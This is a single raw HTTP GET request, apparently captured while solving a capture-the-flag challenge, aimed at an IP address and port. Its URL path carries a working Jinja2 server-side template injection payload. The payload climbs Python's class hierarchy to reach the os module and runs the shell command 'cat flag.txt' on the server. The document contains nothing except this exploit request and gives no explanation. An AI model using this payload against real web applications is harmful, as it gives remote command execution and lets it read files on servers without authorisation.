GET /%7B%7B%20''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['os'].popen('cat%20flag.txt').read()%20%7D%7D HTTP/1.1
 Host: 138.68.171.242:31360
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 
 
